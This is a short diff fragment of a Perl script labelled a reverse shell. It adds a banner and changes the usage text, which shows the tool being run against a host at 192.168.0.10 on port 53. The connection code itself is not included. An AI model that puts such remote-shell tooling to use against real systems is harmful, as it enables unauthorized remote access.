@@ -8,7 +8,17 @@ use Socket;
 use warnings;
 use strict;
 
-sub usage { die "usage: perl $0 <host> <port>\nex:\n\tperl $0 192.168.0.10 53 &"; }
+sub banner
+{
+  print 
+"\tm0nad's reverse shell\n\n";
+}
+sub usage 
+{ 
+  print "usage:\n  perl $0 <host> <port>\nex:\n  perl $0 192.168.0.10 53 &\n\n"; 
+  exit;
+}
+banner();
 my $host = shift;
 my $port = shift || &usage;
 
